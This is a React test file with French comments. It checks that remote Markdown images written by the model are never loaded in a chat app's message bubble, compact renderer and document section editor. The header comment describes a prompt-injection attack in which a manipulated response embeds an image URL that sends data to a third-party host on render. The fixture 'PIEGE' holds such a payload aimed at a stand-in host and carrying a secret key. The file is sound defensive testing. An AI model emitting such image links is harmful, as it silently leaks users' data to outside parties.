/**
 * B-1050 (cycle 12) : les sections de document rédigées par le modèle étaient
 * rendues en Markdown sans surcharge de l'élément image, et la CSP autorise
 * `img-src https:` (la bulle du chat et le rendu compact étaient déjà gardés). Une
 * réponse manipulée par injection de prompt (page web, e-mail résumés) peut
 * écrire `![](https://tiers/?d=<données>)` : l'image se charge à l'affichage
 * et la requête emporte les données, sans un clic. Une image distante venue
 * d'un texte du modèle n'est donc jamais chargée : elle est nommée.
 */
import { render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

vi.mock('../../services/api', async () => ({
  ...await vi.importActual<typeof import('../../services/api')>('../../services/api'),
  downloadSkillFile: vi.fn(), fetchImageObjectUrl: vi.fn(),
}));

import { MessageBubble } from '../chat/MessageBubble';
import { CompactMarkdown } from './CompactMarkdown';
import { SectionEditor } from '../documents/SectionEditor';
import type { Message } from '../../stores/chatStore';
import type { DocumentSection } from '../../services/api/documents';

const PIEGE = 'Résumé prêt. ![logo](https://tiers.example/p.png?d=CLE_SECRETE) Fin.';

function imagesDistantes(container: HTMLElement) {
  return [...container.querySelectorAll('img')].filter((img) => !/^(data|blob):/.test(img.getAttribute('src') ?? ''));
}

describe('B-1050 : une image distante écrite par le modèle n’est jamais chargée', () => {
  it('bulle de réponse du chat', () => {
    const message = { id: 'm', role: 'assistant', content: PIEGE, timestamp: new Date() } as Message;
    const { container } = render(<MessageBubble message={message} />);
    // Garde déjà en place depuis la revue 0.41.2 (F4) : témoin de non-régression.
    expect(imagesDistantes(container)).toEqual([]);
    expect(screen.getByText(/Image externe non chargée/i)).toBeInTheDocument();
  });

  it('rendu compact (Board, actions)', () => {
    const { container } = render(<CompactMarkdown>{PIEGE}</CompactMarkdown>);
    expect(imagesDistantes(container)).toEqual([]);
    expect(screen.getByText(/image non affichée/i)).toBeInTheDocument();
  });

  it('section de document rédigée par le modèle', () => {
    const section: DocumentSection = {
      id: 's1', document_id: 'd1', title: 'Introduction', brief: '', order: 10, depth: 0,
      content: PIEGE, summary: '', status: 'brouillon', orphan: false,
      created_at: '2026-07-01T00:00:00Z', updated_at: '2026-07-01T00:00:00Z',
    };
    const { container } = render(
      <SectionEditor section={section} isStreaming={false} error={null} onUpdateSection={vi.fn()} onDraft={vi.fn()} onValidate={vi.fn()} />,
    );
    expect(imagesDistantes(container)).toEqual([]);
    expect(screen.getByText(/image non affichée/i)).toBeInTheDocument();
  });
});
